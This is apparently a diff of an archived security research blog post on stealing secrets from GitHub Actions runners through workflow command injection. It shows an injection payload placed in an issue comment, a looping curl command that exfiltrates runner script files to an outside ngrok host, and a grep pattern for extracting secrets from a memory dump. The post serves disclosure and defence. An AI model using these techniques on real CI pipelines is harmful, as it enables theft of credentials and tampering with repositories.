@@ -65,7 +65,7 @@ page going offline. To read the original, follow the link above.
 
  05 Jan 2023
 
-GitHub Actions is a CI/CD solution built into GitHub. It allows users to for example, deploy their repository’s code on every push, or to automatically respond on new GitHub issues. Actions workflows are defined as YAML files placed into `.github/workflows`. Workflows are composed of jobs, which run asynchronously and in separate hosted machines;[1]() and jobs are broken into steps.
+GitHub Actions is a CI/CD solution built into GitHub. It allows users to for example, deploy their repository’s code on every push, or to automatically respond on new GitHub issues. Actions workflows are defined as YAML files placed into `.github/workflows`. Workflows are composed of jobs, which run asynchronously and in separate hosted machines;1 and jobs are broken into steps.
 
 As far as security is concerned, the main vulnerability in GitHub Actions is command injection. Take the following workflow:
 
@@ -107,7 +107,7 @@ jobs:
 
 ```
 
-Therefore, if a workflow job is vulnerable to command injection, we can leak its secrets. In above example, commenting `"; echo $API_KEY | xxd -p` [2]() will print the API key to the build logs.
+Therefore, if a workflow job is vulnerable to command injection, we can leak its secrets. In above example, commenting `"; echo $API_KEY | xxd -p` 2 will print the API key to the build logs.
 
 However, not all workflows expose secrets through environment variables. What if the `${{ secrets.API_KEY }}` was directly referenced in the curl command? In addition, what if the curl command was in a different step than the command injection? Even more, what if no secrets were referenced—is there any impact? In this blogpost, I will document the inner-workings of the GitHub Actions runner (the code which executes workflow jobs). Then, I will explore various ways to leak secret values from GitHub Actions: reading files and environment variables, monitoring network/process communication, and dumping memory.
 
@@ -174,7 +174,7 @@ Once I triggered the workflow (by creating an issue comment), the long-poll requ
 
 ![A screenshot of Burp Suite showing a response to the messages request. The response includes an "iv" value and an encrypted "body" value.](https://www.karimrahal.com/images/github-actions-leaking-secrets/2cXnTwI.png)
 
-Since I have the private key, I can decrypt the AES encryption key and decrypt the message body. Consulting the Actions runner source code, I wrote the following decryption script:[3]()
+Since I have the private key, I can decrypt the AES encryption key and decrypt the message body. Consulting the Actions runner source code, I wrote the following decryption script:3
 
 ```
 import sys
@@ -224,7 +224,7 @@ Before executing a job, *Runner.Worker* must translate the job details into exec
 
 (Note that I am running a reverse shell from the runner machine. You can alternatively read the values from the build logs or exfiltrate them.)
 
-This will also print shell actions that have executed in a previous step. For future shell actions, we create an asynchronous process that continuously exfiltrates `.sh` files from `/home/runner/work/_temp`:[4]()
+This will also print shell actions that have executed in a previous step. For future shell actions, we create an asynchronous process that continuously exfiltrates `.sh` files from `/home/runner/work/_temp`:4
 
 ```
 while true; do curl -s 'https://4ddc-91-197-46-143.ngrok.io' -H "Content-Type: text/plain" -d "$(cat /home/runner/work/_temp/*)" -o /dev/null; done &
@@ -253,11 +253,11 @@ while true; do curl -s 'https://4ddc-91-197-46-143.ngrok.io' -H "Content-Type: t
 
 ![Screenshot of the dumped environment variables. "INPUT_EXAMPLE_ARGUMENT_1=SECRET VALUE" is highlighted.](https://www.karimrahal.com/images/github-actions-leaking-secrets/fKOEN2u.png)
 
-We have now made progress: we can leak secrets of shell and JavaScript actions, not just secrets referenced in environment variables. These techniques have been similarly documented by Alex Ilgayev from Cycode.[5]()
+We have now made progress: we can leak secrets of shell and JavaScript actions, not just secrets referenced in environment variables. These techniques have been similarly documented by Alex Ilgayev from Cycode.5
 
 However, while we can retrieve the secrets of shell actions no matter the step order, we cannot do the same for JavaScript actions. If a JavaScript action runs before our command injection, the Node.js process won’t be available for us to read its environment variables.
 
-Furthermore, a JavaScript action can contain an execution condition (through the `if` key) that we cannot pass:[6]()
+Furthermore, a JavaScript action can contain an execution condition (through the `if` key) that we cannot pass:6
 
 ```
 - name: An Example of a JavaScript Action
@@ -304,7 +304,7 @@ grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
 
 And as such, we have all the secret values referenced by the workflow job. We don’t need to worry about JavaScript actions coming before our command injection step, or JavaScript actions having strict execution conditions. *All your base are belong to us*, and we’ve got your secrets!
 
-Nevertheless, one challenge remains: what security impact exists when a workflow job doesn’t reference secrets? Notice that the secrets include a GitHub access token value (under `system.github.token`). This value is always included in workflow runs: among other things, the runner uses it to authenticate to the GitHub API and install remote JavaScript actions.[7]() Therefore, we can always leak the token—even if not referenced with `${{ secrets.GITHUB_TOKEN }}`. The token has by default read-write permissions to the repository, and we can use it to modify the repository’s code![8]()
+Nevertheless, one challenge remains: what security impact exists when a workflow job doesn’t reference secrets? Notice that the secrets include a GitHub access token value (under `system.github.token`). This value is always included in workflow runs: among other things, the runner uses it to authenticate to the GitHub API and install remote JavaScript actions.7 Therefore, we can always leak the token—even if not referenced with `${{ secrets.GITHUB_TOKEN }}`. The token has by default read-write permissions to the repository, and we can use it to modify the repository’s code
 
 There is an exception ofcourse. Organizations and repositories can enforce read-only permissions on the token, depending on the triggering event. But when that isn’t the case, using the token provides a high security impact—writing to the repository.
 
@@ -342,34 +342,34 @@ Alex Ilgayev, security reseacher at Cycode, also writes about GitHub Actions vul
 
 -
 
-Jobs can be configured to run synchronously, but they will still run on separate machines. [↩]()
+Jobs can be configured to run synchronously, but they will still run on separate machines. ↩
 
 -
 
-The API key is hex-encoded using xxd because GitHub Actions automatically censors secret values from build logs. The censorship is nevertheless a good feature for users. In 2019, [others and I showed](https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/) that builds logs on Travis CI, another CI/CD solution, were exposing sensitive information due to lax censorship. [↩]()
+The API key is hex-encoded using xxd because GitHub Actions automatically censors secret values from build logs. The censorship is nevertheless a good feature for users. In 2019, [others and I showed](https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/) that builds logs on Travis CI, another CI/CD solution, were exposing sensitive information due to lax censorship. ↩
 
 -
 
-The decryption may differ per the runner’s configuration and operating system. [Lines 354-372 of `src/Runner.Listener/MessageListener.cs`](https://github.com/actions/runner/blob/caec043085990710070108f375cd0aeab45e1017/src/Runner.Listener/MessageListener.cs#L354-L372) include the decryption code. [↩]()
+The decryption may differ per the runner’s configuration and operating system. [Lines 354-372 of `src/Runner.Listener/MessageListener.cs`](https://github.com/actions/runner/blob/caec043085990710070108f375cd0aeab45e1017/src/Runner.Listener/MessageListener.cs#L354-L372) include the decryption code. ↩
 
 -
 
-I am exfiltrating values to an HTTP ngrok instance. ngrok is an ingress tool useful for exposing local ports. [↩]()
+I am exfiltrating values to an HTTP ngrok instance. ngrok is an ingress tool useful for exposing local ports. ↩
 
 -
 
-You can read Alex’s analysis of GitHub Actions command injection at [https://cycode.com/github-actions-vulnerabilities/](https://cycode.com/github-actions-vulnerabilities/)[↩]()
+You can read Alex’s analysis of GitHub Actions command injection at [https://cycode.com/github-actions-vulnerabilities/](https://cycode.com/github-actions-vulnerabilities/)↩
 
 -
 
-Shell actions can also have `if` conditions. But that doesn’t matter for our purposes: the expanded `.sh` file will still contain the secrets, even when the process never runs. [↩]()
+Shell actions can also have `if` conditions. But that doesn’t matter for our purposes: the expanded `.sh` file will still contain the secrets, even when the process never runs. ↩
 
 -
 
-The usage of the GitHub token to download JavaScript actions can be found on [line 798 of `src/Runner.Worker/ActionManager.cs`](https://github.com/actions/runner/blob/caec043085990710070108f375cd0aeab45e1017/src/Runner.Worker/ActionManager.cs#L798). [↩]()
+The usage of the GitHub token to download JavaScript actions can be found on [line 798 of `src/Runner.Worker/ActionManager.cs`](https://github.com/actions/runner/blob/caec043085990710070108f375cd0aeab45e1017/src/Runner.Worker/ActionManager.cs#L798). ↩
 
 -
 
-The token expires shortly after the job finishes, so a hacker must automate their exploit against the repository. [↩]()
+The token expires shortly after the job finishes, so a hacker must automate their exploit against the repository. ↩
 
  [GitHub Actions](https://www.karimrahal.com/tag/GitHub-Actions) [Security](https://www.karimrahal.com/tag/Security)
